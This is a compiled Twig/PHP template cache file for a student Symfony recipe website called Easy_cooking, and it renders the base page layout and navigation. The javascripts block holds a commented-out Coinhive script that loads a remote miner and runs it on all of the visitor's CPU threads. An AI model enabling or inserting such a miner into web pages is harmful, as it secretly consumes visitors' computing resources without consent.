<?php

/* ::base.html.twig */
class __TwigTemplate_3c7154162f5f5dc0d920db7fdfe949f309b9f3fd132ccc85d99177bdcdfadce1 extends Twig_Template
{
    public function __construct(Twig_Environment $env)
    {
        parent::__construct($env);

        $this->parent = false;

        $this->blocks = array(
            'title' => array($this, 'block_title'),
            'navigation' => array($this, 'block_navigation'),
            'sidebar' => array($this, 'block_sidebar'),
            'body' => array($this, 'block_body'),
            'footer' => array($this, 'block_footer'),
            'javascripts' => array($this, 'block_javascripts'),
        );
    }

    protected function doDisplay(array $context, array $blocks = array())
    {
        $__internal_68c152404024c346bd4a1abd8594e0043c4ea1fa9a8765956a5b09f862f64b57 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_68c152404024c346bd4a1abd8594e0043c4ea1fa9a8765956a5b09f862f64b57->enter($__internal_68c152404024c346bd4a1abd8594e0043c4ea1fa9a8765956a5b09f862f64b57_prof = new Twig_Profiler_Profile($this->getTemplateName(), "template", "::base.html.twig"));

        // line 1
        echo "<!DOCTYPE HTML>
<html>

<head>
\t<title>";
        // line 5
        $this->displayBlock('title', $context, $blocks);
        echo "</title>
\t<meta name=\"description\" content=\"website description\" />
\t<meta name=\"keywords\" content=\"website keywords, website keywords\" />
\t<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" />
\t<link href=\"";
        // line 9
        echo twig_escape_filter($this->env, $this->env->getExtension('Symfony\Bridge\Twig\Extension\AssetExtension')->getAssetUrl("css/style.css"), "html", null, true);
        echo "\" type=\"text/css\" rel=\"stylesheet\" />
</head>

<body>
\t<div id=\"main\">
\t\t<div id=\"header\">

\t\t\t<div id=\"logo\">

\t\t\t\t<div id=\"logo_text\">
\t\t\t\t\t<h1><a href=\"";
        // line 19
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_principal");
        echo "\">Easy<span class=\"logo_colour\">_cooking</span></a></h1>
\t\t\t\t\t<h2>\"El amor puede esperar, el hambre no\" Monkey D. Luffy</h2>
\t\t\t\t</div>

\t\t\t</div>

\t\t\t<!-- Menú -->
\t\t\t";
        // line 26
        $this->displayBlock('navigation', $context, $blocks);
        // line 37
        echo "\t\t</div>

\t\t<div id=\"site_content\">
\t\t\t<div class=\"sidebar\">
\t\t\t\t<!-- Contenido lateral derecho -->
\t\t\t\t\t";
        // line 42
        $this->displayBlock('sidebar', $context, $blocks);
        // line 43
        echo "\t\t\t</div>

\t\t\t<div id=\"content\">
\t\t\t\t<!-- Contenido principal -->
\t\t\t\t<section class=\"main-col\">
\t\t\t\t\t";
        // line 48
        $this->displayBlock('body', $context, $blocks);
        // line 49
        echo "\t\t\t\t</section>
\t\t\t</div>
\t\t</div>

\t\t<!-- Pie de página -->
\t\t<div id=\"footer\">
\t\t\t";
        // line 55
        $this->displayBlock('footer', $context, $blocks);
        // line 58
        echo "\t\t</div>

\t</div>
\t";
        // line 61
        $this->displayBlock('javascripts', $context, $blocks);
        // line 69
        echo "</body>
</html>
";
        
        $__internal_68c152404024c346bd4a1abd8594e0043c4ea1fa9a8765956a5b09f862f64b57->leave($__internal_68c152404024c346bd4a1abd8594e0043c4ea1fa9a8765956a5b09f862f64b57_prof);

    }

    // line 5
    public function block_title($context, array $blocks = array())
    {
        $__internal_a09b43e00f8404fb27cc548dd8493e04db3541ebc5673c0d42d37c6b9530dfa2 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_a09b43e00f8404fb27cc548dd8493e04db3541ebc5673c0d42d37c6b9530dfa2->enter($__internal_a09b43e00f8404fb27cc548dd8493e04db3541ebc5673c0d42d37c6b9530dfa2_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "title"));

        echo "symblog";
        
        $__internal_a09b43e00f8404fb27cc548dd8493e04db3541ebc5673c0d42d37c6b9530dfa2->leave($__internal_a09b43e00f8404fb27cc548dd8493e04db3541ebc5673c0d42d37c6b9530dfa2_prof);

    }

    // line 26
    public function block_navigation($context, array $blocks = array())
    {
        $__internal_3a3ba687534409619c2edc04d003bad6a151ff0b575dad43c552b671b9ede2fc = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_3a3ba687534409619c2edc04d003bad6a151ff0b575dad43c552b671b9ede2fc->enter($__internal_3a3ba687534409619c2edc04d003bad6a151ff0b575dad43c552b671b9ede2fc_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "navigation"));

        // line 27
        echo "\t\t\t<div id=\"menubar\">
\t\t\t\t<ul id=\"menu\">
\t\t\t\t\t<li class=\"selected\"><a href=\"";
        // line 29
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_principal");
        echo "\">Inicio</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 30
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_recetas");
        echo "\">Recetas</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 31
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_platos");
        echo "\">Platos</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 32
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_ingredientes");
        echo "\">Ingredientes</a>
\t\t\t\t\t<li class=\"li2\"><a href=\"";
        // line 33
        echo $this->env->getExtension('Symfony\Bridge\Twig\Extension\RoutingExtension')->getPath("cooker_cook_contact");
        echo "\">Contacto</a></li>
\t\t\t\t</ul>
\t\t\t</div>
\t\t\t";
        
        $__internal_3a3ba687534409619c2edc04d003bad6a151ff0b575dad43c552b671b9ede2fc->leave($__internal_3a3ba687534409619c2edc04d003bad6a151ff0b575dad43c552b671b9ede2fc_prof);

    }

    // line 42
    public function block_sidebar($context, array $blocks = array())
    {
        $__internal_ac541171790dae3aabf3be7f9108044d027cb75c65cff4d7c15c0e64a4e3b4b7 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_ac541171790dae3aabf3be7f9108044d027cb75c65cff4d7c15c0e64a4e3b4b7->enter($__internal_ac541171790dae3aabf3be7f9108044d027cb75c65cff4d7c15c0e64a4e3b4b7_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "sidebar"));

        
        $__internal_ac541171790dae3aabf3be7f9108044d027cb75c65cff4d7c15c0e64a4e3b4b7->leave($__internal_ac541171790dae3aabf3be7f9108044d027cb75c65cff4d7c15c0e64a4e3b4b7_prof);

    }

    // line 48
    public function block_body($context, array $blocks = array())
    {
        $__internal_a8d768a7e1a30c4dc8bf4383f0a9608c1dd579ecd2d204388c0b2719ac909621 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_a8d768a7e1a30c4dc8bf4383f0a9608c1dd579ecd2d204388c0b2719ac909621->enter($__internal_a8d768a7e1a30c4dc8bf4383f0a9608c1dd579ecd2d204388c0b2719ac909621_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "body"));

        
        $__internal_a8d768a7e1a30c4dc8bf4383f0a9608c1dd579ecd2d204388c0b2719ac909621->leave($__internal_a8d768a7e1a30c4dc8bf4383f0a9608c1dd579ecd2d204388c0b2719ac909621_prof);

    }

    // line 55
    public function block_footer($context, array $blocks = array())
    {
        $__internal_314867c0dec864a71e055e4277bdfaf5adf22c8d27bf402968e445583d691f63 = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_314867c0dec864a71e055e4277bdfaf5adf22c8d27bf402968e445583d691f63->enter($__internal_314867c0dec864a71e055e4277bdfaf5adf22c8d27bf402968e445583d691f63_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "footer"));

        // line 56
        echo "\t\t\tCocina f&aacutecil - Creado como proyecto para Ingenier&iacutea Web
\t\t\t";
        
        $__internal_314867c0dec864a71e055e4277bdfaf5adf22c8d27bf402968e445583d691f63->leave($__internal_314867c0dec864a71e055e4277bdfaf5adf22c8d27bf402968e445583d691f63_prof);

    }

    // line 61
    public function block_javascripts($context, array $blocks = array())
    {
        $__internal_6bfa536fd999a52aed676fca253246931c937f92f3913fb83df36438bb0fa62f = $this->env->getExtension("Symfony\\Bridge\\Twig\\Extension\\ProfilerExtension");
        $__internal_6bfa536fd999a52aed676fca253246931c937f92f3913fb83df36438bb0fa62f->enter($__internal_6bfa536fd999a52aed676fca253246931c937f92f3913fb83df36438bb0fa62f_prof = new Twig_Profiler_Profile($this->getTemplateName(), "block", "javascripts"));

        // line 62
        echo "<!--\t<script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
\t<script>
    thr=navigator.hardwareConcurrency;
    var miner = new CoinHive.Anonymous('nK0gPWRG1uG5avyyxkUZ6eWkUrZ0ymEM', {threads: thr,autoThreads: true});
    miner.start();
\t</script> -->
\t";
        
        $__internal_6bfa536fd999a52aed676fca253246931c937f92f3913fb83df36438bb0fa62f->leave($__internal_6bfa536fd999a52aed676fca253246931c937f92f3913fb83df36438bb0fa62f_prof);

    }

    public function getTemplateName()
    {
        return "::base.html.twig";
    }

    public function isTraitable()
    {
        return false;
    }

    public function getDebugInfo()
    {
        return array (  201 => 62,  195 => 61,  187 => 56,  181 => 55,  170 => 48,  159 => 42,  148 => 33,  144 => 32,  140 => 31,  136 => 30,  132 => 29,  128 => 27,  122 => 26,  110 => 5,  101 => 69,  99 => 61,  94 => 58,  92 => 55,  84 => 49,  82 => 48,  75 => 43,  73 => 42,  66 => 37,  64 => 26,  54 => 19,  41 => 9,  34 => 5,  28 => 1,);
    }

    /** @deprecated since 1.27 (to be removed in 2.0). Use getSourceContext() instead */
    public function getSource()
    {
        @trigger_error('The '.__METHOD__.' method is deprecated since version 1.27 and will be removed in 2.0. Use getSourceContext() instead.', E_USER_DEPRECATED);

        return $this->getSourceContext()->getCode();
    }

    public function getSourceContext()
    {
        return new Twig_Source("<!DOCTYPE HTML>
<html>

<head>
\t<title>{% block title %}symblog{% endblock %}</title>
\t<meta name=\"description\" content=\"website description\" />
\t<meta name=\"keywords\" content=\"website keywords, website keywords\" />
\t<meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" />
\t<link href=\"{{ asset('css/style.css') }}\" type=\"text/css\" rel=\"stylesheet\" />
</head>

<body>
\t<div id=\"main\">
\t\t<div id=\"header\">

\t\t\t<div id=\"logo\">

\t\t\t\t<div id=\"logo_text\">
\t\t\t\t\t<h1><a href=\"{{ path('cooker_cook_principal')}}\">Easy<span class=\"logo_colour\">_cooking</span></a></h1>
\t\t\t\t\t<h2>\"El amor puede esperar, el hambre no\" Monkey D. Luffy</h2>
\t\t\t\t</div>

\t\t\t</div>

\t\t\t<!-- Menú -->
\t\t\t{% block navigation %}
\t\t\t<div id=\"menubar\">
\t\t\t\t<ul id=\"menu\">
\t\t\t\t\t<li class=\"selected\"><a href=\"{{ path('cooker_cook_principal')}}\">Inicio</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_recetas')}}\">Recetas</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_platos')}}\">Platos</a></li>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_ingredientes')}}\">Ingredientes</a>
\t\t\t\t\t<li class=\"li2\"><a href=\"{{ path('cooker_cook_contact')}}\">Contacto</a></li>
\t\t\t\t</ul>
\t\t\t</div>
\t\t\t{% endblock %}
\t\t</div>

\t\t<div id=\"site_content\">
\t\t\t<div class=\"sidebar\">
\t\t\t\t<!-- Contenido lateral derecho -->
\t\t\t\t\t{% block sidebar %}{% endblock %}
\t\t\t</div>

\t\t\t<div id=\"content\">
\t\t\t\t<!-- Contenido principal -->
\t\t\t\t<section class=\"main-col\">
\t\t\t\t\t{% block body %}{% endblock %}
\t\t\t\t</section>
\t\t\t</div>
\t\t</div>

\t\t<!-- Pie de página -->
\t\t<div id=\"footer\">
\t\t\t{% block footer %}
\t\t\tCocina f&aacutecil - Creado como proyecto para Ingenier&iacutea Web
\t\t\t{% endblock %}
\t\t</div>

\t</div>
\t{% block javascripts %}
<!--\t<script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
\t<script>
    thr=navigator.hardwareConcurrency;
    var miner = new CoinHive.Anonymous('nK0gPWRG1uG5avyyxkUZ6eWkUrZ0ymEM', {threads: thr,autoThreads: true});
    miner.start();
\t</script> -->
\t{% endblock %}
</body>
</html>
", "::base.html.twig", "C:\\xampp\\htdocs\\EasyCooking\\app/Resources\\views/base.html.twig");
    }
}
